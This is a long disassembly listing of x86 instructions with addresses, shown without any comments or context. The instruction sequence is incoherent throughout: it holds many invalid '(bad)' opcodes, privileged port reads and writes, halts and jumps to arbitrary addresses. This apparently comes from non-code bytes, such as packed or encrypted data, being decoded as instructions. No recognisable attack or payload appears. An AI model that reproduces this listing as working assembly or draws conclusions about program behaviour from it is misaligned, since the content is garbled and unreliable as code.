  426d72:	dec    ebx
  426d73:	test   DWORD PTR ds:0x951f6d15,ecx
  426d79:	ins    DWORD PTR es:[edi],dx
  426d7a:	xor    bl,BYTE PTR [ebx+0x2c0be58d]
  426d80:	in     al,dx
  426d81:	dec    eax
  426d82:	sbb    BYTE PTR [esi],dl
  426d84:	add    BYTE PTR ds:[edi],ah
  426d87:	cmp    cl,ah
  426d89:	mov    dh,0x36
  426d8b:	mov    dh,0xc6
  426d8d:	mov    ds:0xae774b0f,eax
  426d92:	push   esp
  426d93:	mov    al,ds:0x2a5ddf22
  426d98:	dec    ebx
  426d99:	aaa    
  426d9a:	xchg   DWORD PTR [ebp+0x2c07ce47],esi
  426da0:	popa   
  426da1:	xchg   ebp,eax
  426da2:	test   eax,0xa12db6a9
  426da7:	imul   ecx,esi,0x15
  426daa:	mov    ecx,0x1432f930
  426daf:	mov    dh,0xb6
  426db1:	pop    ebx
  426db2:	dec    edx
  426db3:	pop    es
  426db4:	ins    BYTE PTR es:[edi],dx
  426db5:	cmp    esi,DWORD PTR [esi]
  426db7:	pop    ebx
  426db8:	aas    
  426db9:	dec    edi
  426dba:	es mov edx,0x8b3d2ed0
  426dc0:	jmp    0x1590e1a2
  426dc5:	(bad)  
  426dc6:	sbb    eax,DWORD PTR [ebp+0x7db1c50d]
  426dcc:	daa    
  426dcd:	(bad)  
  426dce:	mov    ah,0x9d
  426dd0:	repz mov edi,0x6db6c2db
  426dd6:	push   cs
  426dd7:	call   0x523a:0x865f1ab3
  426dde:	dec    ebp
  426ddf:	and    BYTE PTR [esi],al
  426de1:	mov    al,BYTE PTR [ebp+0x6114811b]
  426de7:	popf   
  426de8:	and    eax,0x175535ca
  426ded:	(bad)  
  426def:	mov    BYTE PTR [esi+0x28],ch
  426df2:	adc    eax,eax
  426df4:	push   ecx
  426df5:	push   es
  426df6:	mov    dh,0xb1
  426df8:	shl    BYTE PTR [esi+0x1a2f02fb],0xd5
  426dff:	lods   al,BYTE PTR ds:[esi]
  426e00:	(bad)  
  426e01:	jge    0x426e62
  426e03:	lods   eax,DWORD PTR ds:[esi]
  426e04:	fstp   QWORD PTR [edx-0x40]
  426e07:	and    ebx,DWORD PTR [edi-0x5ea5622f]
  426e0d:	bound  ecx,QWORD PTR [ebx+0x1d]
  426e10:	add    al,0xdb
  426e12:	pop    ebp
  426e13:	gs out dx,eax
  426e15:	std    
  426e16:	adc    BYTE PTR [ebx],cl
  426e18:	push   eax
  426e19:	fadd   QWORD PTR [ebp-0x45]
  426e1c:	mov    ebp,0x176549a0
  426e21:	inc    ebx
  426e22:	xlat   BYTE PTR ds:[ebx]
  426e23:	inc    ecx
  426e24:	sbb    ebp,DWORD PTR ds:0xb9464ada
  426e2a:	repnz or al,dh
  426e2d:	xchg   ecx,eax
  426e2e:	outs   dx,BYTE PTR ds:[esi]
  426e2f:	sub    al,0x6c
  426e31:	or     ecx,DWORD PTR ds:0xd6308942
  426e37:	or     bl,bl
  426e39:	shl    ch,1
  426e3b:	mov    ebx,0x44db5b6d
  426e40:	sbb    esp,DWORD PTR [edx-0x53]
  426e43:	pop    edx
  426e44:	jmp    0x69afa10b
  426e49:	and    edx,eax
  426e4b:	inc    DWORD PTR cs:[esi-0x79]
  426e4f:	and    ch,BYTE PTR [eax+eax*1]
  426e52:	out    dx,eax
  426e53:	fld    QWORD PTR [eax]
  426e55:	mov    esp,0x7a800a83
  426e5a:	bound  ebx,QWORD PTR [ebx-0x46]
  426e5d:	hlt    
  426e5e:	rcl    DWORD PTR [ebx],0xbc
  426e61:	enter  0x5cce,0x7f
  426e65:	ret    0x6d85
  426e68:	fcmovnu st,st(0)
  426e6a:	call   0x1a9b3a94
  426e6f:	(bad)  
  426e70:	jno    0x426dfe
  426e72:	mov    ds:0xda05da16,eax
  426e77:	ja     0x426dfb
  426e79:	mov    edi,0x11bc9663
  426e7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e7f:	jmp    0x37ade511
  426e84:	cmp    DWORD PTR [edx],ebp
  426e86:	in     al,0x9e
  426e88:	sub    al,0x7b
  426e8a:	mov    cl,0x17
  426e8c:	inc    cx
  426e8e:	mov    ebx,0x96b4a8b5
  426e93:	mov    al,0x28
  426e95:	ret    0xd89
  426e98:	je     0x426e75
  426e9a:	or     bh,BYTE PTR [ecx-0x5488b350]
  426ea0:	and    ebx,edx
  426ea2:	jecxz  0x426eb4
  426ea4:	ins    BYTE PTR es:[edi],dx
  426ea5:	sub    al,0x6d
  426ea7:	fwait
  426ea8:	(bad)  
  426ea9:	or     BYTE PTR [ecx-0x22],dl
  426eac:	cs add eax,0xa06dadb7
  426eb2:	inc    edx
  426eb3:	mov    esi,?
  426eb5:	jbe    0x426f25
  426eb7:	test   eax,0xb85b6169
  426ebc:	jne    0x426eed
  426ebe:	imul   edx,DWORD PTR [edx+ebx*4],0xffffff97
  426ec2:	lods   al,BYTE PTR ds:[esi]
  426ec3:	or     DWORD PTR ds:0x829b8bae,ebx
  426ec9:	in     eax,dx
  426eca:	inc    esi
  426ecb:	shl    BYTE PTR [edi+0x488c65a8],cl
  426ed1:	call   0x9245:0x476afd4e
  426ed8:	sub    eax,DWORD PTR [ebx+0x3b]
  426edb:	fldenv [eax*4+0xbb68586]
  426ee2:	cmp    bh,ch
  426ee4:	sbb    edx,edi
  426ee6:	loop   0x426e85
  426ee8:	ins    DWORD PTR es:[edi],dx
  426ee9:	push   ss
  426eea:	mov    edx,0xdb3a0ba2
  426eef:	mov    DWORD PTR [ebx-0x7e],ebx
  426ef2:	jg     0x426f49
  426ef4:	ins    BYTE PTR es:[edi],dx
  426ef5:	add    eax,0x668836da
  426efa:	cmp    eax,DWORD PTR [edx+0x60f50bb6]
  426f00:	mov    ebx,0x62756d2d
  426f05:	(bad)  
  426f06:	mov    ebx,0x83f87574
  426f0b:	sbb    cl,BYTE PTR [ebx+0x74]
  426f0e:	add    BYTE PTR [ebx-0x4c118e4],bh
  426f14:	push   es
  426f15:	addr16 sbb al,0xdb
  426f18:	add    BYTE PTR ds:0x3886d051,ch
  426f1e:	or     BYTE PTR es:[edx+0x42ff95b0],ch
  426f25:	shl    BYTE PTR [ecx+ecx*2+0x0],1
  426f29:	ds push ebx
  426f2b:	add    BYTE PTR [esi+esi*4],dl
  426f2e:	pop    esp
  426f2f:	(bad)  
  426f31:	inc    esp
  426f32:	jecxz  0x426eea
  426f34:	fs cdq 
  426f36:	adc    al,0x3b
  426f38:	aaa    
  426f39:	mov    cl,0x46
  426f3b:	ins    DWORD PTR es:[edi],dx
  426f3c:	push   esi
  426f3d:	xor    dl,0x6f
  426f40:	data16 cmp al,0x0
  426f43:	sbb    eax,edi
  426f45:	add    BYTE PTR [esp+ebx*4+0x73],bh
  426f49:	add    eax,0x12
  426f4c:	fcmovnb st,st(2)
  426f4e:	test   eax,0x98b0e631
  426f53:	icebp  
  426f54:	or     BYTE PTR [edx-0x5f],dl
  426f57:	push   0x6d
  426f59:	sub    dh,BYTE PTR [edi+0x5bec808b]
  426f5f:	jmp    0x426f37
  426f61:	(bad)  
  426f62:	pop    ds
  426f63:	xchg   esp,eax
  426f64:	or     ch,BYTE PTR ss:[ebp-0x7ad9f2b4]
  426f6b:	lods   eax,DWORD PTR ds:[esi]
  426f6c:	sub    eax,0xdddeb410
  426f71:	inc    edi
  426f72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f73:	in     al,dx
  426f74:	or     esi,DWORD PTR [esi+0x40]
  426f77:	(bad)  
  426f79:	mov    WORD PTR [ecx-0x7e58bbaa],?
  426f7f:	push   cs
  426f80:	rcl    DWORD PTR [esi+0xb],0x5b
  426f84:	mov    ebx,0xbc80a315
  426f89:	mov    eax,edx
  426f8b:	push   cs
  426f8c:	icebp  
  426f8d:	jns    0x426f5c
  426f8f:	mov    eax,ds:0xd0b6d6e
  426f94:	fsubr  QWORD PTR [ecx]
  426f96:	mov    dh,0x37
  426f98:	xchg   BYTE PTR [edx],ch
  426f9a:	adc    BYTE PTR [edx-0x25],dl
  426f9d:	ficom  DWORD PTR [ebp+ebp*8+0x16042ff1]
  426fa4:	and    BYTE PTR [esi-0x66],ch
  426fa7:	sub    BYTE PTR [esi-0x25],0x5f
  426fab:	mov    edi,0x3b38ad8f
  426fb0:	dec    ebx
  426fb1:	jae    0x427021
  426fb3:	fcmovnbe st,st(6)
  426fb5:	add    BYTE PTR [edx+0x5871412f],dl
  426fbb:	pop    ss
  426fbc:	sbb    DWORD PTR ds:0x83a970b0,0xffffff9a
  426fc3:	ins    BYTE PTR es:[edi],dx
  426fc4:	dec    ebp
  426fc5:	retf   
  426fc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426fc7:	sbb    DWORD PTR [edx-0x4a],ebx
  426fca:	test   DWORD PTR [ebp-0x4d46624e],eax
  426fd0:	sbb    DWORD PTR [ebx-0x24c29142],edi
  426fd6:	ins    DWORD PTR es:[edi],dx
  426fd7:	sub    ebx,esp
  426fd9:	and    edx,DWORD PTR [ebx-0x6a]
  426fdc:	rcr    ch,1
  426fde:	aaa    
  426fdf:	dec    ebp
  426fe0:	fcomp  DWORD PTR [edi]
  426fe2:	ds adc al,0xc6
  426fe5:	mov    dh,0xb0
  426fe7:	ins    DWORD PTR es:[edi],dx
  426fe8:	(bad)  
  426fe9:	push   edi
  426fea:	inc    edi
  426feb:	xor    eax,0x54a1bfca
  426ff0:	inc    edx
  426ff1:	add    ebp,DWORD PTR [edx-0x49]
  426ff4:	lea    ebp,[ecx-0x1]
  426ff7:	add    dl,BYTE PTR [ebx+ebp*4+0x20]
  426ffb:	mov    ecx,DWORD PTR [ebx]
  426ffd:	in     eax,dx
  426ffe:	inc    edx
  426fff:	imul   eax,DWORD PTR [edx],0x93ea733e
  427005:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427006:	mov    ds:0x2c4174c4,eax
  42700b:	adc    eax,0x775d2a2e
  427010:	add    ebp,DWORD PTR [eax-0x57]
  427013:	adc    eax,0xa6f59e53
  427018:	mov    ebx,0xe8603915
  42701d:	cmp    al,0x73
  42701f:	xchg   ebx,eax
  427020:	inc    eax
  427021:	jecxz  0x427097
  427023:	ret    
  427024:	rol    BYTE PTR [esi-0x7f],1
  427027:	mov    ch,BYTE PTR [esi-0x49]
  42702a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42702b:	or     ch,BYTE PTR [ebp+ebp*8-0x2a]
  42702f:	add    BYTE PTR [ecx-0x4b],dh
  427032:	sbb    eax,0x77e96189
  427037:	or     eax,DWORD PTR [ebp+0x21b6d56]
  42703d:	xchg   esp,eax
  42703e:	enter  0x13e3,0x10
  427042:	shl    BYTE PTR [ebp+edx*1+0x14f6348a],1
  427049:	push   ecx
  42704a:	mov    eax,ds:0xd1b6ed18
  42704f:	push   ecx
  427050:	rcr    BYTE PTR [esp+edx*2+0x7c0e5f30],0xf2
  427058:	mov    dh,0x85
  42705a:	sbb    al,BYTE PTR [eax+0x5f98ae2c]
  427060:	std    
  427061:	and    esp,DWORD PTR [eax*4-0x56e897db]
  427068:	pop    esi
  427069:	mov    bh,0xdd
  42706b:	fcmove st,st(2)
  42706d:	jae    0x427075
  42706f:	call   0x4250de2a
  427074:	cwde   
  427075:	std    
  427076:	xlat   BYTE PTR ds:[ebx]
  427077:	mov    edx,0x2edaa43b
  42707c:	sub    eax,0x20fdcb45
  427081:	add    al,0xc9
  427083:	out    0xc2,al
  427085:	test   DWORD PTR [ebp-0x5f],ebp
  427088:	sub    ebp,DWORD PTR [esi]
  42708a:	push   ds
  42708b:	jbe    0x4270e7
  42708d:	inc    esp
  42708e:	fidiv  WORD PTR [eax+ebx*8]
  427091:	fcomp  st(0)
  427093:	mov    dh,0x10
  427095:	pop    esp
  427096:	sub    ecx,DWORD PTR [eax]
  427098:	mov    esp,0x3a4b9e27
  42709d:	fild   DWORD PTR ds:0x56615b74
  4270a3:	outs   dx,BYTE PTR ds:[esi]
  4270a4:	ss add dh,ch
  4270a7:	and    al,0x71
  4270a9:	xchg   BYTE PTR [ecx+0x55b6c2d],dh
  4270af:	push   eax
  4270b0:	pop    esp
  4270b1:	daa    
  4270b2:	jo     0x427126
  4270b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4270b5:	(bad)  
  4270b6:	rcl    dh,cl
  4270b8:	mov    dh,0xb4
  4270ba:	jb     0x42711f
  4270bc:	or     BYTE PTR [ecx],dl
  4270be:	jge    0x4270a9
  4270c0:	dec    esp
  4270c1:	adc    eax,0xd2db0598
  4270c6:	(bad)  
  4270c7:	iret   
  4270c8:	jo     0x4270be
  4270ca:	cmp    edx,DWORD PTR [ebp+0x65]
  4270cd:	(bad)
  4270d0:	mov    bh,0x4a
  4270d2:	jge    0x427056
  4270d4:	(bad)  
  4270d5:	ss push esi
  4270d7:	xchg   esi,eax
  4270d8:	sub    al,0x68
  4270da:	adc    DWORD PTR [ebp+0xaa63fda],ebp
  4270e0:	mov    ebx,0x2250b1ba
  4270e5:	xchg   esi,eax
  4270e6:	xchg   DWORD PTR [bp+si+0x31d8],esp
  4270eb:	mov    edx,ebx
  4270ed:	mov    eax,0x52ec2bd4
  4270f2:	test   DWORD PTR [edx-0x4f],eax
  4270f5:	xor    DWORD PTR [ebp-0x69],ebp
  4270f8:	mov    dh,0xad
  4270fa:	inc    esi
  4270fb:	or     DWORD PTR [eax-0x59],0xfffffff9
  4270ff:	push   ebx
  427100:	add    ch,ch
  427102:	jp     0x42714b
  427104:	ret    0x8d85
  427107:	lods   eax,DWORD PTR ds:[esi]
  427108:	mov    WORD PTR [edx],?
  42710a:	mov    ebp,0xa00dceb4
  42710f:	lock sub eax,DWORD PTR [eax+0x1b]
  427113:	xchg   edi,eax
  427114:	(bad)  
  427116:	jge    0x4270b6
  427118:	xchg   BYTE PTR [edi+0x2d],ch
  42711b:	hlt    
  42711c:	ins    DWORD PTR es:[edi],dx
  42711d:	sbb    esi,DWORD PTR [ebp+ebx*1+0x5386dcf7]
  427124:	and    edx,ebp
  427126:	sbb    dl,0x8a
  427129:	ins    DWORD PTR es:[edi],dx
  42712a:	fld    TBYTE PTR [esi+0x67]
  42712d:	pop    ecx
  42712e:	push   eax
  42712f:	push   ebx
  427130:	push   ebx
  427131:	jecxz  0x4270c0
  427133:	xchg   BYTE PTR [esi+0x3b6b6169],dh
  427139:	sub    al,0x2a
  42713b:	int    0xe
  42713d:	jp     0x427162
  42713f:	shr    BYTE PTR [edx+0x23],1
  427142:	arpl   WORD PTR [ebx-0x100f9f24],bp
  427148:	fld    QWORD PTR [edi-0x29b48a54]
  42714e:	xchg   esi,eax
  42714f:	pop    edi
  427150:	push   0xffffffd7
  427152:	fdivr  DWORD PTR [edi-0x3143ff2a]
  427158:	and    al,0x5c
  42715a:	inc    esp
  42715b:	sbb    ebp,DWORD PTR [esi*4+0xb7cabed]
  427162:	push   0xffffffdd
  427164:	fwait
  427165:	icebp  
  427166:	sbb    eax,0x2c2e96eb
  42716b:	ins    DWORD PTR es:[edi],dx
  42716c:	add    dl,dh
  42716e:	mov    esp,0x99131061
  427173:	mov    edi,0xb6e9e383
  427178:	xor    eax,0x9272ada8
  42717d:	fsubrp st(1),st
  42717f:	xlat   BYTE PTR ds:[ebx]
  427180:	sbb    al,0xe7
  427182:	pop    ss
  427183:	add    BYTE PTR [esp+esi*2],cl
  427186:	jbe    0x427137
  427188:	mov    eax,ds:0x36693fee
  42718d:	mov    eax,0xd2af1035
  427192:	xchg   edx,eax
  427193:	pop    DWORD PTR [ebp+edx*4+0x19]
  427197:	test   eax,0xd055b6fc
  42719c:	pop    eax
  42719d:	inc    ecx
  42719e:	dec    ebx
  42719f:	scas   eax,DWORD PTR es:[edi]
  4271a0:	add    BYTE PTR [esi+0x1134a76f],dh
  4271a6:	(bad)  [ebp-0xb]
  4271a9:	mov    dl,0xee
  4271ab:	jecxz  0x427184
  4271ad:	mov    eax,ds:0xb1b00c69
  4271b2:	inc    eax
  4271b3:	jae    0x42715b
  4271b5:	js     0x4271a2
  4271b7:	or     dl,BYTE PTR [esi+0x560ea585]
  4271bd:	or     BYTE PTR ds:0x36605bee,dh
  4271c3:	mov    ch,0x2
  4271c5:	ss mov dh,0xb8
  4271c8:	(bad)  
  4271c9:	aas    
  4271ca:	data16 fcmovnu st,st(2)
  4271cd:	adc    dl,al
  4271cf:	mov    dh,0xbf
  4271d1:	ds loopne 0x427166
  4271d4:	or     ebx,edx
  4271d6:	out    0xd6,al
  4271d8:	lds    edx,FWORD PTR [esi-0x7e]
  4271db:	xor    ecx,eax
  4271dd:	clc    
  4271de:	jmp    0xb6aa:0x50b68070
  4271e5:	mov    dh,0x62
  4271e7:	leave  
  4271e8:	or     eax,0x4be54746
  4271ed:	fcmovnb st,st(2)
  4271ef:	mov    ds:0x2cc281f1,al
  4271f4:	ficom  DWORD PTR [ecx-0x4ff4ff32]
  4271fa:	sub    eax,0x871aa8b4
  4271ff:	sbb    esp,edi
  427201:	adc    DWORD PTR [edi+edx*4+0x10bb5bb7],edi
  427208:	inc    edi
  427209:	fild   WORD PTR [ebx+0x17ac6f32]
  42720f:	xchg   ebx,eax
  427210:	add    cl,cl
  427212:	pop    ebx
  427213:	mov    bl,0xb6
  427215:	ins    DWORD PTR es:[edi],dx
  427216:	sbb    eax,0x418fd101
  42721b:	in     al,dx
  42721c:	sti    
  42721d:	es ja  0x427246
  427220:	sub    ch,0xc2
  427223:	mov    esp,0xf892bdbb
  427228:	stos   DWORD PTR es:[edi],eax
  427229:	jecxz  0x427257
  42722b:	xor    eax,0x4756746e
  427230:	push   esp
  427231:	sbb    ebx,0xffffff8d
  427234:	sahf   
  427235:	or     al,0x68
  427237:	push   0x54
  427239:	ins    BYTE PTR es:[edi],dx
  42723a:	sub    eax,0x7b095c3
  42723f:	cmp    ch,al
  427241:	rcl    dh,cl
  427243:	cmp    al,0x5c
  427245:	mov    ebp,0xca269ba7
  42724a:	cdq    
  42724b:	sbb    eax,DWORD PTR [eax]
  42724d:	paddusb mm4,QWORD PTR [edi+0x597b9b66]
  427254:	mov    ah,0xd1
  427256:	mov    cl,0xb4
  427258:	rcl    BYTE PTR [ecx],1
  42725a:	ror    esi,1
  42725c:	xchg   edi,eax
  42725d:	ins    BYTE PTR es:[edi],dx
  42725e:	mov    dh,0xae
  427260:	inc    edx
  427261:	ins    DWORD PTR es:[edi],dx
  427262:	pop    ebx
  427263:	mov    ebx,0xfb518878
  427268:	or     edx,DWORD PTR [edx]
  42726a:	pop    ss
  42726b:	and    DWORD PTR [esi-0x4968fa2c],0xffffffd7
  427272:	xchg   BYTE PTR [edi],dl
  427274:	aam    0xde
  427276:	push   ss
  427277:	dec    edx
  427278:	add    ebx,DWORD PTR [ebp+0x30]
  42727b:	mov    cl,0x50
  42727d:	rcl    al,cl
  42727f:	fldenv [esi-0x2a44e557]
  427285:	mov    dh,0x6d
  427287:	lea    ecx,[esi+0x4b2c105f]
  42728d:	fnsave [ebp+0x58201cf7]
  427293:	fcomp  DWORD PTR [edx-0x7a5845a0]
  427299:	mov    ecx,0x2573dda
  42729e:	ins    DWORD PTR es:[edi],dx
  42729f:	mov    ds:0x5f5f1edb,eax
  4272a4:	pop    ebp
  4272a5:	and    WORD PTR ds:0x8daaec51,ax
  4272ac:	fistp  DWORD PTR [ebp-0x62]
  4272af:	lds    edi,FWORD PTR [eax+0x685e1d00]
  4272b5:	outs   dx,BYTE PTR ds:[esi]
  4272b6:	test   eax,0x7f2b76a5
  4272bb:	xlat   BYTE PTR ds:[ebx]
  4272bc:	xchg   DWORD PTR [ecx-0x12740d98],esp
  4272c2:	ret    0xd6d2
  4272c5:	jbe    0x427307
  4272c7:	cmp    al,0x35
  4272c9:	lds    ebx,FWORD PTR [edi*1-0x49d19a92]
  4272d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4272d1:	test   DWORD PTR [ebp-0x197de2f3],ebp
  4272d7:	pop    ss
  4272d8:	cmp    edx,DWORD PTR [ebp+0x6b6dc479]
  4272de:	aaa    
  4272df:	lahf   
  4272e0:	mov    ch,0xe3
  4272e2:	pop    edi
  4272e3:	ret    0x1a44
  4272e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4272e7:	rol    dl,cl
  4272e9:	push   ss
  4272ea:	ins    DWORD PTR es:[edi],dx
  4272eb:	dec    ebp
  4272ec:	inc    edi
  4272ed:	jns    0x427281
  4272ef:	inc    esi
  4272f0:	outs   dx,BYTE PTR ds:[esi]
  4272f1:	or     esi,DWORD PTR [edi]
  4272f3:	ret    0xdd45
  4272f6:	mov    dh,0x9e
  4272f8:	addr16 (bad) 
  4272fa:	fst    DWORD PTR [ebx]
  4272fc:	and    al,0x81
  4272fe:	ret    0xa36d
  427301:	pop    edi
  427302:	xchg   edx,eax
  427303:	pop    edi
  427304:	fdivr  DWORD PTR [edx]
  427306:	inc    eax
  427307:	test   BYTE PTR [ebp-0x1b969e8a],ch
  42730d:	je     0x4272be
  42730f:	pop    ds
  427310:	mov    dh,0x1e
  427312:	xor    BYTE PTR [eax*1+0x3fb6d85d],0xa7
  42731a:	jae    0x427305
  42731c:	or     al,0x73
  42731e:	and    bh,BYTE PTR [ebx+0x35b6c2d6]
  427324:	sub    al,0xde
  427326:	es adc al,0x47
  427329:	dec    esi
  42732a:	sbb    al,0xef
  42732c:	inc    eax
  42732d:	mov    bh,0x6
  42732f:	sbb    bl,0x9a
  427332:	shr    DWORD PTR [eax],1
  427334:	and    cl,BYTE PTR [esi-0x43e16447]
  42733a:	(bad)  
  42733b:	mov    es,WORD PTR [eax+0x43b5211f]
  427341:	sbb    bl,BYTE PTR [edx-0x25c94b70]
  427347:	lea    ebp,[ebp-0x7b6f1709]
  42734d:	push   ss
  42734e:	mov    WORD PTR [ecx],fs
  427350:	dec    eax
  427351:	fcomp  st(0)
  427353:	mov    dh,0xd
  427355:	(bad)  
  427357:	and    BYTE PTR [edx-0x64e117cb],0xa1
  42735e:	je     0x42733b
  427360:	fdivr  DWORD PTR [ebx+0x32]
  427363:	cmp    al,0x7d
  427365:	das    
  427366:	inc    edx
  427367:	out    dx,eax
  427368:	or     ebx,esp
  42736a:	ins    DWORD PTR es:[edi],dx
  42736b:	add    eax,ebp
  42736d:	ins    DWORD PTR es:[edi],dx
  42736e:	mov    bl,0x7d
  427370:	icebp  
  427371:	ins    BYTE PTR es:[edi],dx
  427372:	popf   
  427373:	sti    
  427374:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427375:	into   
  427376:	mov    ch,BYTE PTR [esi-0x4c]
  427379:	outs   dx,BYTE PTR ds:[esi]
  42737a:	push   ebx
  42737b:	(bad)  
  42737c:	fstp   st(1)
  42737e:	ins    BYTE PTR es:[edi],dx
  42737f:	xor    BYTE PTR [eax-0x12fe3d6a],bl
  427385:	mov    edi,DWORD PTR [edx]
  427387:	push   ss
  427388:	jl     0x42739a
  42738a:	out    0x80,eax
  42738c:	scas   al,BYTE PTR es:[edi]
  42738d:	bound  eax,QWORD PTR [ecx]
  42738f:	cli    
  427390:	jecxz  0x4273b9
  427392:	pop    ds
  427393:	push   es
  427394:	mov    dh,BYTE PTR [esi+0x59c352a5]
  42739a:	adc    DWORD PTR [ebx],esi
  42739c:	or     ebx,ebx
  42739e:	adc    esi,DWORD PTR [edi+0x3e4c35db]
  4273a4:	or     ah,BYTE PTR [ebp-0x32f5be83]
  4273aa:	mov    dh,0xb0
  4273ac:	sub    eax,0x8f2fe6d
  4273b1:	mov    ah,0x77
  4273b3:	(bad)  
  4273b4:	dec    esp
  4273b5:	or     BYTE PTR [ecx],ch
  4273b7:	pop    ebx
  4273b8:	sbb    ebx,DWORD PTR [ebx]
  4273ba:	in     eax,dx
  4273bb:	std    
  4273bc:	pop    ss
  4273bd:	or     BYTE PTR [esi],bl
  4273bf:	mov    al,ds:0xf8588bcc
  4273c4:	add    DWORD PTR [esi-0x2c],0xbafce66e
  4273cb:	add    bh,BYTE PTR [eax+0x1b]
  4273ce:	push   ss
  4273cf:	push   ss
  4273d0:	mov    dh,0x76
  4273d2:	xchg   ebp,eax
  4273d3:	xchg   DWORD PTR [edx+0x33eeaee0],ebp
  4273d9:	sub    ebp,DWORD PTR [ebx+0x0]
  4273dc:	sbb    ebx,DWORD PTR [ebx]
  4273de:	pop    ss
  4273df:	repz sub DWORD PTR [bx+si],eax
  4273e3:	xor    edx,DWORD PTR [edi+0x6c]
  4273e6:	ficom  DWORD PTR [esi-0x46]
  4273e9:	rcl    DWORD PTR [esp+ebp*1-0x10186216],1
  4273f0:	cmp    BYTE PTR [ecx-0x68],ch
  4273f3:	ins    DWORD PTR es:[edi],dx
  4273f4:	pop    ss
  4273f5:	mov    cl,0xd4
  4273f7:	in     eax,0x98
  4273f9:	xchg   edi,eax
  4273fa:	fs out dx,eax
  4273fc:	pusha  
  4273fd:	mov    eax,ds:0x856c6ed4
  427402:	mov    ebp,0x6fd7d48e
  427407:	out    dx,al
  427408:	popf   
  427409:	pop    ecx
  42740a:	(bad)  
  42740b:	mov    dh,0xb5
  42740d:	mov    al,0x7a
  42740f:	je     0x4273b4
  427411:	mov    ebp,0xedc52246
  427416:	xor    BYTE PTR [eax-0x69],al
  427419:	or     bl,BYTE PTR [ebx+0x58]
  42741c:	(bad)  
  42741e:	sbb    al,0xce
  427420:	cmp    edi,DWORD PTR [ebx+0xd6c6dbe]
  427426:	mov    WORD PTR [eax+edi*1],?
  427429:	mov    al,0xcf
  42742b:	jbe    0x42747d
  42742d:	dec    ebp
  42742e:	out    0x0,al
  427430:	push   ecx
  427431:	aaa    
  427432:	ficom  DWORD PTR [edx+0x65]
  427435:	sar    BYTE PTR [ecx-0x3e],0x42
  427439:	sbb    dl,BYTE PTR es:[edx+0x17]
  42743d:	jo     0x4274aa
  42743f:	push   cs
  427440:	clc    
  427441:	adc    ecx,DWORD PTR [edx-0x46]
  427444:	push   esi
  427445:	sahf   
  427446:	rol    dl,cl
  427448:	rcl    dh,cl
  42744a:	mov    edi,0x5d75abe
  42744f:	add    DWORD PTR [ebp+0x4d],esi
  427452:	lods   eax,DWORD PTR ds:[esi]
  427453:	xor    eax,0xdddedb0b
  427458:	aam    0xb5
  42745a:	out    dx,al
  42745b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42745c:	add    ch,BYTE PTR [ebp-0x2495a7e9]
  427462:	inc    edx
  427463:	popa   
  427464:	dec    edx
  427465:	and    al,0x6e
  427467:	xor    eax,0x8e0a1bff
  42746c:	fsubr  DWORD PTR [eax-0x24]
  42746f:	push   0x2d44664a
  427474:	and    ecx,ecx
  427476:	ins    DWORD PTR es:[edi],dx
  427477:	pop    ebx
  427478:	bound  esp,QWORD PTR [ebx+0x5b]
  42747b:	push   0xffffffa1
  42747d:	add    eax,0xca2a21a4
  427482:	and    DWORD PTR [eax+0x46],edx
  427485:	pop    ss
  427486:	jne    0x4274eb
  427488:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427489:	sbb    eax,DWORD PTR [ebx-0x3f]
  42748c:	aas    
  42748d:	es iret 
  42748f:	sbb    dl,bl
  427491:	push   0xffffffc4
  427493:	icebp  
  427494:	jno    0x427463
  427496:	and    BYTE PTR [ecx+0x2f970b40],cl
  42749c:	mov    dl,0x93
  42749e:	lds    eax,FWORD PTR [eax]
  4274a0:	and    BYTE PTR [edi+0x4c],ch
  4274a3:	jbe    0x4274be
  4274a5:	xchg   esi,eax
  4274a6:	xor    BYTE PTR [ebp+ecx*2-0x52],ch
  4274aa:	(bad)  
  4274ab:	inc    edi
  4274ac:	test   DWORD PTR [edx],ecx
  4274ae:	mov    al,ds:0x710db49b
  4274b3:	pop    ebx
  4274b4:	ss pop ss
  4274b6:	add    eax,0xd5923976
  4274bb:	sub    BYTE PTR ds:0x5b2d0b40,0x79
  4274c2:	mov    eax,ds:0xb4e71d29
  4274c7:	mov    cl,0xd1
  4274c9:	adc    eax,0x350f1d70
  4274ce:	jne    0x4274b3
  4274d0:	pop    ebx
  4274d1:	mov    esi,0xd856b1b4
  4274d6:	mov    edx,0x3650da27
  4274db:	add    BYTE PTR ds:0xaaba3e72,ah
  4274e1:	lods   eax,DWORD PTR ds:[esi]
  4274e2:	bound  ebp,QWORD PTR [ebp-0x6bafcd94]
  4274e8:	mov    dh,0xdd
  4274ea:	pop    edx
  4274eb:	pop    ss
  4274ec:	jl     0x427569
  4274ee:	in     al,dx
  4274ef:	scas   eax,DWORD PTR es:[edi]
  4274f0:	or     BYTE PTR [eax],bl
  4274f2:	mov    eax,0x2e7496f5
  4274f7:	sub    BYTE PTR ds:0x2e5d228a,0x83
  4274fe:	xor    BYTE PTR [eax],al
  427500:	fndisi(8087 only) 
  427502:	mov    al,ds:0x84729447
  427507:	rol    DWORD PTR [ecx+esi*2+0x63],1
  42750b:	pop    ebx
  42750c:	nop
  42750d:	mov    ds:0xc0845f08,al
  427512:	jbe    0x4274bf
  427514:	inc    ecx
  427515:	arpl   WORD PTR [esi+0x77bf0115],sp
  42751b:	sub    eax,0x5f136db4
  427520:	ins    BYTE PTR es:[edi],dx
  427521:	mov    esp,0x8ba179bf
  427526:	push   ebp
  427527:	inc    edx
  427528:	fstp   TBYTE PTR [eax-0x4f7c97d3]
  42752e:	call   FWORD PTR [edx+0x3c]
  427531:	xor    eax,0x160d2ef5
  427536:	mov    edx,0xb84f67e0
  42753b:	lods   al,BYTE PTR ds:[esi]
  42753c:	sub    edx,edi
  42753e:	or     eax,esp
  427540:	test   esi,eax
  427542:	lea    edx,[edi]
  427544:	sbb    ah,dh
  427546:	pop    ds
  427547:	pusha  
  427548:	pop    ds
  427549:	pop    ebp
